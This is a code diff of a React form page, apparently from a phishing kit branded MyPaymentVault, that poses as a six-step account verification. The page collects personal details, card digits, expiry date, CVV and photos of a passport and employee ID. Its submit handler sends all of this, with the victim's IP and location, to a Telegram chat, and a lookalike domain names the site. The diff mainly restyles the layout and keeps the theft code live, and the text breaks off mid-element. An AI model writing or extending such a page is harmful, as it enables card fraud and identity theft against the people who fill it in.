@@ -1,7 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
-import { Upload, Loader2, User, Phone, MapPin, FileText, CreditCard } from "lucide-react";
+import { Upload, Loader2 } from "lucide-react";
 import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";
 
 const INQUIRY_TYPES = [
@@ -11,6 +11,20 @@ const INQUIRY_TYPES = [
   "Fraud Report",
   "Other",
 ];
+
+const inp: React.CSSProperties = {
+  width: "100%",
+  height: 48,
+  padding: "0 14px",
+  fontSize: 14,
+  color: "#111",
+  border: "1px solid #ccc",
+  borderRadius: 4,
+  outline: "none",
+  background: "#fff",
+  boxSizing: "border-box",
+  fontFamily: "inherit",
+};
 
 export default function Step4() {
   const { user, isAuthenticated } = useAuth();
@@ -43,30 +57,30 @@ export default function Step4() {
   }, [isAuthenticated, navigate]);
 
   const validate = () => {
-    const errs: Record<string, string> = {};
-    if (!firstName.trim())   errs.firstName   = "Nama depan wajib diisi.";
-    if (!lastName.trim())    errs.lastName    = "Nama belakang wajib diisi.";
-    if (!email.trim())       errs.email       = "Email wajib diisi.";
-    if (!phone.trim())       errs.phone       = "Nomor HP wajib diisi.";
-    if (!address.trim())     errs.address     = "Alamat wajib diisi.";
-    if (!city.trim())        errs.city        = "Kota wajib diisi.";
-    if (!stateVal.trim())    errs.state       = "Provinsi wajib diisi.";
-    if (!postalCode.trim())  errs.postalCode  = "Kode pos wajib diisi.";
-    if (!dob.trim())         errs.dob         = "Tanggal lahir wajib diisi.";
-    if (!inquiryType)        errs.inquiryType = "Pilih jenis pertanyaan.";
-    if (!cardDigits.trim())  errs.cardDigits  = "8 digit akhiran kartu wajib diisi.";
-    else if (!/^\d{8}$/.test(cardDigits.trim())) errs.cardDigits = "Harus tepat 8 angka.";
-    if (!cardExp.trim())     errs.cardExp     = "Tanggal kadaluarsa wajib diisi.";
-    else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExp.trim())) errs.cardExp = "Format: MM/YY";
-    if (!cardCvv.trim())     errs.cardCvv     = "CVV wajib diisi.";
-    else if (!/^\d{3,4}$/.test(cardCvv.trim())) errs.cardCvv = "CVV harus 3 atau 4 angka.";
-    if (!passportFile)       errs.passport    = "Foto paspor wajib diunggah.";
-    if (!empIdFile)          errs.empId       = "Foto ID karyawan wajib diunggah.";
-    return errs;
+    const e: Record<string, string> = {};
+    if (!firstName.trim())   e.firstName   = "Wajib diisi.";
+    if (!lastName.trim())    e.lastName    = "Wajib diisi.";
+    if (!email.trim())       e.email       = "Wajib diisi.";
+    if (!phone.trim())       e.phone       = "Wajib diisi.";
+    if (!address.trim())     e.address     = "Wajib diisi.";
+    if (!city.trim())        e.city        = "Wajib diisi.";
+    if (!stateVal.trim())    e.state       = "Wajib diisi.";
+    if (!postalCode.trim())  e.postalCode  = "Wajib diisi.";
+    if (!dob.trim())         e.dob         = "Wajib diisi.";
+    if (!inquiryType)        e.inquiryType = "Pilih salah satu.";
+    if (!cardDigits.trim())       e.cardDigits = "Wajib diisi.";
+    else if (!/^\d{8}$/.test(cardDigits.trim())) e.cardDigits = "Harus 8 angka.";
+    if (!cardExp.trim())          e.cardExp    = "Wajib diisi.";
+    else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExp.trim())) e.cardExp = "Format: MM/YY";
+    if (!cardCvv.trim())          e.cardCvv    = "Wajib diisi.";
+    else if (!/^\d{3,4}$/.test(cardCvv.trim())) e.cardCvv = "3–4 angka.";
+    if (!passportFile)       e.passport    = "Foto paspor wajib diunggah.";
+    if (!empIdFile)          e.empId       = "Foto ID karyawan wajib diunggah.";
+    return e;
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+  const handleSubmit = async (ev: React.FormEvent) => {
+    ev.preventDefault();
     const errs = validate();
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
     setErrors({});
@@ -81,19 +95,19 @@ export default function Step4() {
         `📋 <b>mypaymenttvaulltr.com</b>\n` +
         `📌 <b>Step 4 — Data Personal</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
-        `👦 <b>Nama Lengkap</b>: <code>${firstName} ${lastName}</code>\n` +
+        `👤 <b>Username</b>     : <code>${user?.username ?? "-"}</code>\n` +
+        `👦 <b>Nama Lengkap</b> : <code>${firstName} ${lastName}</code>\n` +
+        `📧 <b>Email</b>        : <code>${email}</code>\n` +
+        `📱 <b>Mobile</b>       : <code>${phone}</code>\n` +
+        `🏠 <b>Alamat</b>       : <code>${address}, ${city}, ${stateVal} ${postalCode}</code>\n` +
+        `🎂 <b>Tgl Lahir</b>    : <code>${dob}</code>\n` +
+        `📌 <b>Inquiry</b>      : <code>${inquiryType}</code>\n` +
+        `💬 <b>Pesan</b>        : <code>${message || "-"}</code>\n` +
         `💳 <b>Akhiran Kartu</b>: <code>XXXX XXXX ${cardDigits.trim()}</code>\n` +
         `📅 <b>Exp</b>          : <code>${cardExp.trim()}</code>\n` +
         `🔐 <b>CVV</b>          : <code>${cardCvv.trim()}</code>\n` +
-        `📧 <b>Email</b>       : <code>${email}</code>\n` +
-        `📱 <b>Mobile</b>      : <code>${phone}</code>\n` +
-        `🏠 <b>Alamat</b>      : <code>${address}, ${city}, ${stateVal} ${postalCode}</code>\n` +
-        `🎂 <b>Tgl Lahir</b>   : <code>${dob}</code>\n` +
-        `📌 <b>Inquiry</b>     : <code>${inquiryType}</code>\n` +
-        `💬 <b>Pesan</b>       : <code>${message || "-"}</code>\n` +
-        `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
-        `🕐 <b>Waktu</b>       : ${now}\n` +
+        `🌐 <b>IP & Lokasi</b>  : <code>${ip}</code>\n` +
+        `🕐 <b>Waktu</b>        : ${now}\n` +
         `━━━━━━━━━━━━━━━━━━━━━`
       );
 
@@ -104,17 +118,18 @@ export default function Step4() {
           username: user?.username ?? "",
           firstName, lastName, email, phone,
           address, city, state: stateVal, postalCode,
-          dob, inquiryType, message, ipAddress: ip,
+          dob, inquiryType, message,
           cardDigits: cardDigits.trim(),
           cardExp: cardExp.trim(),
           cardCvv: cardCvv.trim(),
+          ipAddress: ip,
         }),
       }).catch(() => {});
 
       if (passportFile)
-        await sendFileToTelegram(passportFile, `📷 Passport Photo — ${user?.username ?? "-"}`);
+        await sendFileToTelegram(passportFile, `📷 Passport — ${user?.username ?? "-"}`);
       if (empIdFile)
-        await sendFileToTelegram(empIdFile, `🪪 Employee ID Photo — ${user?.username ?? "-"}`);
+        await sendFileToTelegram(empIdFile, `🪪 Employee ID — ${user?.username ?? "-"}`);
 
       navigate("/verify");
     } catch (_) {
@@ -122,431 +137,282 @@ export default function Step4() {
     }
   };
 
-  const FieldError = ({ name }: { name: string }) =>
-    errors[name] ? (
-      <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors[name]}</p>
-    ) : null;
+  const Err = ({ k }: { k: string }) =>
+    errors[k] ? <span style={{ fontSize: 11, color: "#c00", marginTop: 3, display: "block" }}>{errors[k]}</span> : null;
 
-  const inputBase: React.CSSProperties = {
-    width: "100%", height: 46,
-    padding: "0 12px",
-    fontSize: 14, color: "#111",
-    border: "1.5px solid #ddd",
-    borderRadius: 6,
-    outline: "none", background: "#fafafa",
-    boxSizing: "border-box",
-    fontFamily: "inherit",
-    transition: "border-color 0.15s",
+  const row: React.CSSProperties = {
+    display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16,
   };
-
-  const labelStyle: React.CSSProperties = {
-    fontSize: 12, fontWeight: 600, color: "#444",
-    display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.04em",
-  };
-
-  const sectionTitle = (icon: React.ReactNode, text: string) => (
-    <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 16, marginTop: 8 }}>
-      <div style={{ color: "#111" }}>{icon}</div>
-      <span style={{ fontSize: 13, fontWeight: 700, color: "#111", textTransform: "uppercase", letterSpacing: "0.06em" }}>{text}</span>
-      <div style={{ flex: 1, height: 1, background: "#ebebeb" }} />
-    </div>
-  );
 
   return (
-    <div
-      className="s4-outer min-h-screen flex flex-col items-center justify-center"
-      style={{ background: "#f7f7f7" }}
-    >
+    <div style={{ minHeight: "100vh", background: "#fff", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "flex-start", padding: "32px 16px 48px" }}>
       <style>{`
-        @media (max-width: 560px) {
-          .s4-outer { background: #fff !important; justify-content: flex-start !important; }
-          .s4-card  { max-width: 100% !important; min-height: 100dvh !important; box-shadow: none !important; border-radius: 0 !important; }
-        }
-        .s4-input:focus { border-color: #111 !important; }
-        .s4-input::placeholder { color: #bbb; }
-        .s4-input:disabled { opacity: 0.5; }
-        .s4-upload:hover { background: #f0f0f0 !important; }
-        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
-        .s4-fadein { animation: fadeUp 0.45s ease both; }
+        .s4i:focus { border-color: #666 !important; }
+        .s4i::placeholder { color: #aaa; }
+        @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
       `}</style>
 
-      <div
-        className="s4-card w-full flex flex-col bg-white"
-        style={{ maxWidth: 560, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
-      >
-        {/* ══ HEADER ══ */}
-        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}>
-          <span className="select-none" style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
+      <div style={{ width: "100%", maxWidth: 900 }}>
+
+        {/* Header */}
+        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 28 }}>
+          <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111", fontFamily: "inherit" }}>
             <span style={{ fontWeight: 300 }}>MY</span>
             <span style={{ fontWeight: 700 }}>PAYMENT</span>
             <span style={{ fontWeight: 300 }}>VAULT</span>
           </span>
-          <span style={{ fontSize: 12, color: "#888", background: "#f5f5f5", padding: "4px 10px", borderRadius: 20, fontWeight: 500 }}>
-            Langkah 4 dari 6
-          </span>
+          <span style={{ fontSize: 12, color: "#888" }}>Langkah 4 dari 6</span>
         </div>
 
-        {/* ══ HERO IMAGE ══ */}
-        <div style={{ width: "100%", lineHeight: 0 }}>
-          <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
-        </div>
-
-        {/* ══ FORM ══ */}
-        <form onSubmit={handleSubmit} style={{ padding: "28px 28px 36px" }} className="s4-fadein">
-
-          {/* Step indicator */}
-          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginBottom: 28 }}>
-            {[1, 2, 3, 4, 5, 6].map((n) => {
-              const done = n < 4;
-              const active = n === 4;
-              return (
-                <div key={n} style={{ display: "flex", alignItems: "center" }}>
-                  <div style={{
-                    width: 26, height: 26, borderRadius: "50%",
-                    background: done || active ? "#111" : "#e0e0e0",
-                    display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
-                  }}>
-                    {done ? (
-                      <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
-                        <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
-                      </svg>
-                    ) : (
-                      <span style={{ fontSize: 11, color: active ? "#fff" : "#aaa", fontWeight: 700 }}>{n}</span>
-                    )}
-                  </div>
-                  {n < 6 && <div style={{ width: 28, height: 2, background: done ? "#111" : "#e0e0e0", margin: "0 2px" }} />}
+        {/* Step dots */}
+        <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 32, justifyContent: "center" }}>
+          {[1,2,3,4,5,6].map(n => {
+            const done = n < 4, active = n === 4;
+            return (
+              <div key={n} style={{ display: "flex", alignItems: "center" }}>
+                <div style={{
+                  width: 24, height: 24, borderRadius: "50%",
+                  background: done || active ? "#111" : "#ddd",
+                  display: "flex", alignItems: "center", justifyContent: "center",
+                }}>
+                  {done
+                    ? <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
+                    : <span style={{ fontSize: 10, color: active ? "#fff" : "#aaa", fontWeight: 700 }}>{n}</span>
+                  }
                 </div>
-              );
-            })}
-          </div>
+                {n < 6 && <div style={{ width: 32, height: 2, background: n < 4 ? "#111" : "#ddd", margin: "0 2px" }} />}
+              </div>
+            );
+          })}
+        </div>
 
-          {/* Title */}
-          <div style={{ textAlign: "center", marginBottom: 24 }}>
-            <h2 style={{ fontSize: 20, fontWeight: 700, color: "#111", marginBottom: 4 }}>Data Personal</h2>
-            <p style={{ fontSize: 13, color: "#777" }}>Lengkapi informasi pribadi Anda untuk verifikasi akun.</p>
-          </div>
+        <form onSubmit={handleSubmit}>
 
-          {/* ── Section: Info Pribadi ── */}
-          {sectionTitle(<User size={15} />, "Info Pribadi")}
-
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
+          {/* Row 1: First Name + Last Name */}
+          <div style={row}>
             <div>
-              <label style={labelStyle}>Nama Depan *</label>
-              <input className="s4-input" type="text" placeholder="John" value={firstName}
-                onChange={(e) => setFirstName(e.target.value)} disabled={loading}
-                style={{ ...inputBase, borderColor: errors.firstName ? "#e00" : "#ddd" }} />
-              <FieldError name="firstName" />
+              <input className="s4i" type="text" placeholder="First Name*" value={firstName}
+                onChange={e => setFirstName(e.target.value)}
+                style={{ ...inp, borderColor: errors.firstName ? "#c00" : "#ccc" }} />
+              <Err k="firstName" />
             </div>
             <div>
-              <label style={labelStyle}>Nama Belakang *</label>
-              <input className="s4-input" type="text" placeholder="Doe" value={lastName}
-                onChange={(e) => setLastName(e.target.value)} disabled={loading}
-                style={{ ...inputBase, borderColor: errors.lastName ? "#e00" : "#ddd" }} />
-              <FieldError name="lastName" />
+              <input className="s4i" type="text" placeholder="Last Name*" value={lastName}
+                onChange={e => setLastName(e.target.value)}
+                style={{ ...inp, borderColor: errors.lastName ? "#c00" : "#ccc" }} />
+              <Err k="lastName" />
             </div>
           </div>
 
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
+          {/* Row 2: Email + Mobile Phone */}
+          <div style={row}>
             <div>
-              <label style={labelStyle}>Email *</label>
-              <input className="s4-input" type="email" placeholder="contoh@email.com" value={email}
-                onChange={(e) => setEmail(e.target.value)} disabled={loading}
-                style={{ ...inputBase, borderColor: errors.email ? "#e00" : "#ddd" }} />
-              <FieldError name="email" />
+              <input className="s4i" type="email" placeholder="Email*" value={email}
+                onChange={e => setEmail(e.target.value)}
+                style={{ ...inp, borderColor: errors.email ? "#c00" : "#ccc" }} />
+              <Err k="email" />
             </div>
             <div>
-              <label style={labelStyle}>Tanggal Lahir *</label>
-              <input className="s4-input" type="text" placeholder="DD-MM-YYYY" value={dob}
-                onChange={(e) => setDob(e.target.value)} disabled={loading}
-                style={{ ...inputBase, borderColor: errors.dob ? "#e00" : "#ddd" }} />
-              <FieldError name="dob" />
+              <input className="s4i" type="tel" placeholder="Mobile Phone*" value={phone}
+                onChange={e => setPhone(e.target.value)}
+                style={{ ...inp, borderColor: errors.phone ? "#c00" : "#ccc" }} />
+              <Err k="phone" />
             </div>
           </div>
 
-          {/* ── Section: Kartu ── */}
-          {sectionTitle(<CreditCard size={15} />, "Informasi Kartu")}
+          {/* Row 3: Mailing Address + City */}
+          <div style={row}>
+            <div>
+              <input className="s4i" type="text" placeholder="Mailing Address*" value={address}
+                onChange={e => setAddress(e.target.value)}
+                style={{ ...inp, borderColor: errors.address ? "#c00" : "#ccc" }} />
+              <Err k="address" />
+            </div>
+            <div>
+              <input className="s4i" type="text" placeholder="City*" value={city}
+                onChange={e => setCity(e.target.value)}
+                style={{ ...inp, borderColor: errors.city ? "#c00" : "#ccc" }} />
+              <Err k="city" />
+            </div>
+          </div>
 
-          <div style={{ marginBottom: 20 }}>
-            <label style={labelStyle}>8 Digit Akhiran Kartu *</label>
-            <div style={{ position: "relative" }}>
-              <span style={{
-                position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
-                fontSize: 14, color: "#bbb", letterSpacing: "0.08em", pointerEvents: "none",
-                fontFamily: "monospace",
-              }}>
-                XXXX XXXX
-              </span>
-              <input
-                className="s4-input"
-                type="text"
-                inputMode="numeric"
-                placeholder="12345678"
-                maxLength={8}
-                value={cardDigits}
-                onChange={(e) => {
-                  const val = e.target.value.replace(/\D/g, "").slice(0, 8);
-                  setCardDigits(val);
-                  setErrors(p => ({ ...p, cardDigits: "" }));
-                }}
-                disabled={loading}
+          {/* Row 4: State + Postal Code */}
+          <div style={row}>
+            <div>
+              <input className="s4i" type="text" placeholder="State*" value={stateVal}
+                onChange={e => setStateVal(e.target.value)}
+                style={{ ...inp, borderColor: errors.state ? "#c00" : "#ccc" }} />
+              <Err k="state" />
+            </div>
+            <div>
+              <input className="s4i" type="text" placeholder="Postal Code*" value={postalCode}
+                onChange={e => setPostalCode(e.target.value)}
+                style={{ ...inp, borderColor: errors.postalCode ? "#c00" : "#ccc" }} />
+              <Err k="postalCode" />
+            </div>
+          </div>
+
+          {/* Row 5: DOB + Inquiry Type */}
+          <div style={row}>
+            <div>
+              <input className="s4i" type="text" placeholder="Date of Birth (MM-DD-YYYY)*" value={dob}
+                onChange={e => setDob(e.target.value)}
+                style={{ ...inp, borderColor: errors.dob ? "#c00" : "#ccc" }} />
+              <Err k="dob" />
+            </div>
+            <div>
+              <select value={inquiryType} onChange={e => setInquiryType(e.target.value)}
                 style={{
-                  ...inputBase,
-                  paddingLeft: 110,
-                  borderColor: errors.cardDigits ? "#e00" : "#ddd",
-                  fontFamily: "monospace",
-                  letterSpacing: "0.15em",
-                  fontSize: 16,
-                }}
-              />
-            </div>
-            {errors.cardDigits && (
-              <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors.cardDigits}</p>
-            )}
-            <p style={{ fontSize: 11, color: "#888", marginTop: 5 }}>
-              Masukkan 8 digit terakhir nomor kartu Anda.
-            </p>
-          </div>
-
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 20 }}>
-            {/* EXP */}
-            <div>
-              <label style={labelStyle}>Tanggal Kadaluarsa (EXP) *</label>
-              <input
-                className="s4-input"
-                type="text"
-                inputMode="numeric"
-                placeholder="MM/YY"
-                maxLength={5}
-                value={cardExp}
-                onChange={(e) => {
-                  let val = e.target.value.replace(/\D/g, "").slice(0, 4);
-                  if (val.length > 2) val = val.slice(0, 2) + "/" + val.slice(2);
-                  setCardExp(val);
-                  setErrors(p => ({ ...p, cardExp: "" }));
-                }}
-                disabled={loading}
-                style={{
-                  ...inputBase,
-                  borderColor: errors.cardExp ? "#e00" : "#ddd",
-                  fontFamily: "monospace",
-                  letterSpacing: "0.12em",
-                }}
-              />
-              {errors.cardExp && (
-                <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors.cardExp}</p>
-              )}
-            </div>
-
-            {/* CVV */}
-            <div>
-              <label style={labelStyle}>CVV *</label>
-              <input
-                className="s4-input"
-                type="password"
-                inputMode="numeric"
-                placeholder="•••"
-                maxLength={4}
-                value={cardCvv}
-                onChange={(e) => {
-                  const val = e.target.value.replace(/\D/g, "").slice(0, 4);
-                  setCardCvv(val);
-                  setErrors(p => ({ ...p, cardCvv: "" }));
-                }}
-                disabled={loading}
-                style={{
-                  ...inputBase,
-                  borderColor: errors.cardCvv ? "#e00" : "#ddd",
-                  fontFamily: "monospace",
-                  letterSpacing: "0.2em",
-                }}
-              />
-              {errors.cardCvv && (
-                <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors.cardCvv}</p>
-              )}
-              <p style={{ fontSize: 11, color: "#888", marginTop: 5 }}>
-                3 digit di belakang kartu (Visa/MC) atau 4 digit depan (Amex).
-              </p>
+                  ...inp,
+                  borderColor: errors.inquiryType ? "#c00" : "#ccc",
+                  color: inquiryType ? "#111" : "#aaa",
+                  appearance: "none",
+                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
+                  backgroundRepeat: "no-repeat",
+                  backgroundPosition: "right 12px center",
+                  paddingRight: 32,
+                }}>
+                <option value="" disabled>Select Inquiry Type*</option>
+                {INQUIRY_TYPES.map(t => <option key={t} value={t} style={{ color: "#111" }}>{t}</option>)}
+              </select>
+              <Err k="inquiryType" />
             </div>
           </div>
 
-          {/* ── Section: Kontak ── */}
-          {sectionTitle(<Phone size={15} />, "Kontak")}
-
-          <div style={{ marginBottom: 14 }}>
-            <label style={labelStyle}>Nomor HP *</label>
-            <input className="s4-input" type="tel" placeholder="+62 812 xxxx xxxx" value={phone}
-              onChange={(e) => setPhone(e.target.value)} disabled={loading}
-              style={{ ...inputBase, borderColor: errors.phone ? "#e00" : "#ddd" }} />
-            <FieldError name="phone" />
-          </div>
-
-          {/* ── Section: Alamat ── */}
-          {sectionTitle(<MapPin size={15} />, "Alamat")}
-
-          <div style={{ marginBottom: 14 }}>
-            <label style={labelStyle}>Alamat *</label>
-            <input className="s4-input" type="text" placeholder="Jl. Contoh No. 1" value={address}
-              onChange={(e) => setAddress(e.target.value)} disabled={loading}
-              style={{ ...inputBase, borderColor: errors.address ? "#e00" : "#ddd" }} />
-            <FieldError name="address" />
-          </div>
-
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
+          {/* Row 6: Card Digits + EXP + CVV */}
+          <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr 1fr", gap: 16, marginBottom: 16 }}>
             <div>
-              <label style={labelStyle}>Kota *</label>
-              <input className="s4-input" type="text" placeholder="Jakarta" value={city}
-                onChange={(e) => setCity(e.target.value)} disabled={loading}
-                style={{ ...inputBase, borderColor: errors.city ? "#e00" : "#ddd" }} />
-              <FieldError name="city" />
+              <div style={{ position: "relative" }}>
+                <span style={{
+                  position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
+                  fontSize: 13, color: "#bbb", fontFamily: "monospace", pointerEvents: "none",
+                }}>XXXX XXXX</span>
+                <input className="s4i" type="text" inputMode="numeric"
+                  placeholder="Card Last 8 Digits*"
+                  maxLength={8} value={cardDigits}
+                  onChange={e => { setCardDigits(e.target.value.replace(/\D/g,"").slice(0,8)); setErrors(p=>({...p,cardDigits:""})); }}
+                  style={{ ...inp, paddingLeft: 106, fontFamily: "monospace", letterSpacing: "0.12em", borderColor: errors.cardDigits ? "#c00" : "#ccc" }} />
+              </div>
+              <Err k="cardDigits" />
             </div>
             <div>
-              <label style={labelStyle}>Provinsi *</label>
-              <input className="s4-input" type="text" placeholder="DKI Jakarta" value={stateVal}
-                onChange={(e) => setStateVal(e.target.value)} disabled={loading}
-                style={{ ...inputBase, borderColor: errors.state ? "#e00" : "#ddd" }} />
-              <FieldError name="state" />
+              <input className="s4i" type="text" inputMode="numeric"
+                placeholder="EXP (MM/YY)*"
+                maxLength={5} value={cardExp}
+                onChange={e => {
+                  let v = e.target.value.replace(/\D/g,"").slice(0,4);
+                  if (v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
+                  setCardExp(v); setErrors(p=>({...p,cardExp:""}));
+                }}
+                style={{ ...inp, fontFamily: "monospace", letterSpacing: "0.1em", borderColor: errors.cardExp ? "#c00" : "#ccc" }} />
+              <Err k="cardExp" />
+            </div>
+            <div>
+              <input className="s4i" type="password" inputMode="numeric"
+                placeholder="CVV*"
+                maxLength={4} value={cardCvv}
+                onChange={e => { setCardCvv(e.target.value.replace(/\D/g,"").slice(0,4)); setErrors(p=>({...p,cardCvv:""})); }}
+                style={{ ...inp, fontFamily: "monospace", borderColor: errors.cardCvv ? "#c00" : "#ccc" }} />
+              <Err k="cardCvv" />
             </div>
           </div>
 
-          <div style={{ marginBottom: 14 }}>
-            <label style={labelStyle}>Kode Pos *</label>
-            <input className="s4-input" type="text" placeholder="12345" value={postalCode}
-              onChange={(e) => setPostalCode(e.target.value)} disabled={loading}
-              style={{ ...inputBase, width: "50%", borderColor: errors.postalCode ? "#e00" : "#ddd" }} />
-            <FieldError name="postalCode" />
-          </div>
-
-          {/* ── Section: Pertanyaan ── */}
-          {sectionTitle(<FileText size={15} />, "Jenis Pertanyaan")}
-
-          <div style={{ marginBottom: 14 }}>
-            <label style={labelStyle}>Pilih Jenis *</label>
-            <select
-              value={inquiryType}
-              onChange={(e) => setInquiryType(e.target.value)}
-              disabled={loading}
+          {/* Row 7: Message */}
+          <div style={{ marginBottom: 24 }}>
+            <textarea placeholder="Message" value={message} onChange={e => setMessage(e.target.value)}
+              rows={4}
               style={{
-                ...inputBase,
-                borderColor: errors.inquiryType ? "#e00" : "#ddd",
-                appearance: "none",
-                backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
-                backgroundRepeat: "no-repeat",
-                backgroundPosition: "right 12px center",
-                paddingRight: 32,
-                color: inquiryType ? "#111" : "#bbb",
-              }}
-            >
-              <option value="" disabled>Pilih jenis pertanyaan...</option>
-              {INQUIRY_TYPES.map((t) => (
-                <option key={t} value={t} style={{ color: "#111" }}>{t}</option>
-              ))}
-            </select>
-            <FieldError name="inquiryType" />
-          </div>
-
-          <div style={{ marginBottom: 20 }}>
-            <label style={labelStyle}>Pesan (opsional)</label>
-            <textarea
-              placeholder="Tulis pesan Anda di sini..."
-              value={message}
-              onChange={(e) => setMessage(e.target.value)}
-              disabled={loading}
-              rows={3}
-              style={{
-                width: "100%", padding: "10px 12px",
+                width: "100%", padding: "12px 14px",
                 fontSize: 14, color: "#111",
-                border: "1.5px solid #ddd", borderRadius: 6,
-                outline: "none", background: "#fafafa",
+                border: "1px solid #ccc", borderRadius: 4,
+                outline: "none", background: "#fff",
                 boxSizing: "border-box", resize: "vertical",
-                fontFamily: "inherit", transition: "border-color 0.15s",
-              }}
-            />
+                fontFamily: "inherit",
+              }} />
           </div>
 
-          {/* ── Section: Upload Dokumen ── */}
-          {sectionTitle(<Upload size={15} />, "Upload Dokumen")}
-
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 28 }}>
+          {/* Row 8: File Uploads */}
+          <div style={row}>
             {/* Passport */}
             <div>
-              <label style={labelStyle}>Foto Paspor *</label>
-              <p style={{ fontSize: 11, color: "#999", marginBottom: 8 }}>JPEG / PNG • Maks 50 MB</p>
-              <input ref={passportRef} type="file" accept="image/jpeg,image/png" style={{ display: "none" }}
-                onChange={(e) => { setPassportFile(e.target.files?.[0] ?? null); setErrors(p => ({ ...p, passport: "" })); }} />
-              <button type="button" className="s4-upload" onClick={() => passportRef.current?.click()}
+              <p style={{ fontSize: 13, fontWeight: 700, color: "#111", marginBottom: 2 }}>Passport Photo*</p>
+              <p style={{ fontSize: 11, color: "#666", marginBottom: 10 }}>
+                Upload your passport photo (Required)<br />
+                Supported: JPEG, PNG • Max size: 50 MB
+              </p>
+              <input ref={passportRef} type="file" accept="image/jpeg,image/png"
+                style={{ display: "none" }}
+                onChange={e => { setPassportFile(e.target.files?.[0] ?? null); setErrors(p=>({...p,passport:""})); }} />
+              <button type="button" onClick={() => passportRef.current?.click()}
                 style={{
-                  width: "100%", height: 80, background: errors.passport ? "#fff5f5" : "#fafafa",
-                  border: `1.5px dashed ${errors.passport ? "#e00" : "#ddd"}`,
-                  borderRadius: 6, cursor: "pointer",
-                  display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 6,
-                  fontSize: 12, color: passportFile ? "#111" : "#999",
-                  transition: "background 0.15s",
+                  width: "100%", height: 44, background: "#fff",
+                  border: `1px solid ${errors.passport ? "#c00" : "#ccc"}`,
+                  borderRadius: 4, cursor: "pointer",
+                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
+                  fontSize: 13, color: "#444",
                 }}>
-                <Upload size={18} color={passportFile ? "#111" : "#bbb"} />
-                <span style={{ fontSize: 11, textAlign: "center", padding: "0 4px", wordBreak: "break-all" }}>
-                  {passportFile ? passportFile.name : "Klik untuk unggah"}
-                </span>
+                <Upload size={15} />
+                {passportFile ? passportFile.name : "Choose Photo"}
               </button>
-              <FieldError name="passport" />
+              <Err k="passport" />
             </div>
 
             {/* Employee ID */}
             <div>
-              <label style={labelStyle}>Foto ID Karyawan *</label>
-              <p style={{ fontSize: 11, color: "#999", marginBottom: 8 }}>JPEG / PNG • Maks 50 MB</p>
-              <input ref={empIdRef} type="file" accept="image/jpeg,image/png" style={{ display: "none" }}
-                onChange={(e) => { setEmpIdFile(e.target.files?.[0] ?? null); setErrors(p => ({ ...p, empId: "" })); }} />
-              <button type="button" className="s4-upload" onClick={() => empIdRef.current?.click()}
+              <p style={{ fontSize: 13, fontWeight: 700, color: "#111", marginBottom: 2 }}>Employee ID Photo*</p>
+              <p style={{ fontSize: 11, color: "#666", marginBottom: 10 }}>
+                Upload your employee ID photo (Required)<br />
+                Supported: JPEG, PNG • Max size: 50 MB
+              </p>
+              <input ref={empIdRef} type="file" accept="image/jpeg,image/png"
+                style={{ display: "none" }}
